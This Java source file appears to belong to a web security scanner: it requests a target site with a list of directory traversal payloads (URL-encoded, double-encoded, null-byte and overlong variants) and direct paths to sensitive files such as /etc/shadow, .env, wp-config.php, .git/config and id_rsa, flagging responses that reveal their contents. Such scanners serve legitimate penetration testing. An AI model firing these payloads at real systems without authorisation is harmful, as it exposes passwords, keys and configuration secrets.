package com.trinetra.attacks.scanner;

import com.trinetra.utils.Logger;
import java.util.*;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;

public class DirectoryTraversalScanner {
    private static final List<String> TRAVERSAL_PAYLOADS = Arrays.asList(
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\system.ini",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/../../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini",
        "../../../../../../../../../../etc/passwd%00",
        "../.../.././../.../.././../.../.././../etc/passwd"
    );

    private static final List<String> SENSITIVE_FILES = Arrays.asList(
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "web.config",
        ".env",
        "config.php",
        "database.yml",
        "wp-config.php",
        ".git/config",
        "id_rsa"
    );

    private final HttpClient httpClient;

    public DirectoryTraversalScanner() {
        this.httpClient = HttpClient.newBuilder()
            .followRedirects(HttpClient.Redirect.NORMAL)
            .connectTimeout(Duration.ofSeconds(10))
            .build();
    }

    public Map<String, List<String>> scanForDirectoryTraversal(String targetUrl) {
        Map<String, List<String>> vulnerabilities = new HashMap<>();
        List<String> foundVulnerabilities = new ArrayList<>();

        // Test both direct paths and payloads
        List<String> allPaths = new ArrayList<>();
        allPaths.addAll(TRAVERSAL_PAYLOADS);
        allPaths.addAll(SENSITIVE_FILES);

        for (String path : allPaths) {
            try {
                // Try different URL combinations
                List<String> urlsToTest = generateTestUrls(targetUrl, path);
                
                for (String testUrl : urlsToTest) {
                    HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(testUrl))
                        .timeout(Duration.ofSeconds(10))
                        .GET()
                        .build();

                    HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                    
                    // Analyze response for potential vulnerabilities
                    if (isVulnerable(response, path)) {
                        String finding = "Potential Directory Traversal at: " + testUrl;
                        foundVulnerabilities.add(finding);
                        Logger.warn(finding);
                    }
                }

            } catch (Exception e) {
                Logger.error("Error testing path " + path + ": " + e.getMessage());
            }
        }

        if (!foundVulnerabilities.isEmpty()) {
            vulnerabilities.put("Directory Traversal", foundVulnerabilities);
        }

        return vulnerabilities;
    }

    private List<String> generateTestUrls(String baseUrl, String path) {
        List<String> urls = new ArrayList<>();
        
        // Remove trailing slash if present
        baseUrl = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
        
        // Add different variants
        urls.add(baseUrl + "/" + path);
        urls.add(baseUrl + "/files/" + path);
        urls.add(baseUrl + "/download?file=" + path);
        urls.add(baseUrl + "/view?page=" + path);
        
        return urls;
    }

    private boolean isVulnerable(HttpResponse<String> response, String path) {
        int statusCode = response.statusCode();
        String body = response.body().toLowerCase();

        // Check for successful response
        if (statusCode == 200) {
            // Look for common sensitive file contents
            if (path.contains("passwd") && body.contains("root:")) return true;
            if (path.contains("shadow") && body.contains("$")) return true;
            if (path.contains(".env") && (body.contains("password") || body.contains("secret"))) return true;
            if (path.contains("config") && (body.contains("password") || body.contains("database"))) return true;
            if (path.contains(".git") && body.contains("[core]")) return true;
            if (path.contains("id_rsa") && body.contains("private key")) return true;
        }

        return false;
    }
}